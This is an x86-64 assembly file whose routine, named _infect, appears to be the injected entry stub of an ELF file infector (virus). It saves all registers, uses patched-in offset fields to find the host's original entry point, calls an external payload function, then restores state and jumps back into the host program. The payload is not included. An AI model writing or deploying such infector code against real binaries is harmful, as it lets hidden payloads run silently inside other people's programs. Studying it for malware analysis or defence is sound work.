section .text
global _infect
global size
global memaddr
extern entry

_infect:
	push rax
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi
	push rbp
	push rsp
	push r8
	push r9
	push r10
	push r11
	push r12
	push r13
	push r15
	pushf

jmp begin
diff: db `00000000`
memaddr: db `00000000`
size: db `00000000`
text_start: db `00000000`
text_length: db `00000000`

begin:
	mov r14, QWORD[rel diff]
	lea rax, [rel _infect]

	mov QWORD[rel memaddr], rax
	
	sub rax, r14
	mov r14, rax
	

	call entry

	popf
	pop r15
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rsp
	pop rbp
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax

	jmp r14
